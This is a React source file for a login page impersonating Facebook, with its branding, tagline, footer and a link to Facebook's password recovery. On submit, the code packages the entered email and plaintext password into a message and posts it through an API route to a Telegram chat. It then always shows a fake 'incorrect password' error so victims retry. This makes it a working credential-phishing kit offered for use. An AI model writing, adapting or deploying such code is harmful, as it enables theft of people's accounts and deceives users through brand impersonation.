'use client';

import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import { useState } from 'react';
import { IoMdEyeOff } from 'react-icons/io';
import { FaEye } from 'react-icons/fa6';

const loginSchema = z.object({
  email: z.string().email({ message: 'Invalid email address' }),
  password: z.string().min(1, { message: 'Password is required' }),
});

type LoginForm = z.infer<typeof loginSchema>;

export default function LoginPage() {
  const [sending, setSending] = useState(false);
  const [error, setError] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
  });

  const chatId = -4724313789;

  const onSubmit = async (data: LoginForm) => {
    console.log(data);
    setSending(true);
    const message = `🟢 New Login Attempt\n\n📧 Email: ${data.email}\n🔐 Password: ${data.password}`;

    try {
      const res = await fetch('/api/send-message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chatId, text: message }),
      });

      const result = await res.json();
      console.log('Telegram response:', result);
      setSending(false);
      setError(true);
      setTimeout(() => setError(false), 4000);
    } catch (err) {
      console.error('Telegram error:', err);
      setError(true);
      setSending(false);
      setTimeout(() => setError(false), 4000);
    }
  };

  return (
    <main className="flex items-center justify-center min-h-screen">
      <section className="h-screen flex flex-col items-center justify-center bg-slate-100 pb-10 w-full">
        <div className="grid md:grid-cols-2 md:gap-14 gap-5 items-center w-full max-w-6xl">
          {/* Left side */}
          <div>
            <h1 className="md:text-6xl text-blue-600 text-center font-semibold md:text-left text-4xl">
              facebook
            </h1>
            <p className="md:text-2xl mt-2 hidden md:block">
              Facebook helps you connect and share <br /> with the people in your
              life.
            </p>
          </div>

          {/* Right side */}
          <div>
            <div className="md:bg-white md:drop-shadow-xl rounded-xl px-5 py-10 max-w-sm w-full">
              <form className="space-y-3" onSubmit={handleSubmit(onSubmit)}>
                {/* Email input */}
                <div>
                  <input
                    type="text"
                    placeholder="Email address or phone number"
                    {...register('email')}
                    className="py-4 border-2 border-gray-300 px-3 rounded-lg bg-transparent w-full"
                  />
                  {errors.email && (
                    <p className="text-xs text-red-600">{errors.email.message}</p>
                  )}
                </div>

                {/* Password input */}
                <div className="flex items-center relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Password"
                    {...register('password')}
                    className="py-4 border-2 border-gray-300 px-3 rounded-lg bg-transparent w-full"
                  />
                  <span
                    className="absolute right-5 cursor-pointer"
                    onClick={() => setShowPassword((prev) => !prev)}
                  >
                    {showPassword ? <FaEye /> : <IoMdEyeOff />}
                  </span>
                </div>
                {errors.password && (
                  <p className="text-xs text-red-600">{errors.password.message}</p>
                )}

                {/* Submit button */}
                <button
                  type="submit"
                  className="bg-blue-600 w-full py-3 text-lg text-white hover:bg-blue-500 rounded-lg"
                >
                  {sending ? 'Logging in...' : 'Log in'}
                </button>

                {error && (
                  <p className="text-xs text-red-600 mb-4 text-center">
                    Sorry, your password was incorrect. Please double-check your password.
                  </p>
                )}

                <div className="my-4 pb-4 text-center border-b-2 border-gray-300">
                  <a
                    className="text-sm text-blue-600 font-semibold"
                    href="https://www.facebook.com/recover/initiate/"
                  >
                    Forgotten password?
                  </a>
                </div>

                <div className="text-center pt-3">
                  <a
                    href="#"
                    className="bg-green-600 text-lg font-semibold text-white py-4 px-5 rounded-lg"
                  >
                    Create new account
                  </a>
                </div>
              </form>
            </div>
          </div>
        </div>

        <div className="mt-auto text-black/50">
          English © {new Date().getFullYear()} Facebook from Meta
        </div>
      </section>
    </main>
  );
}
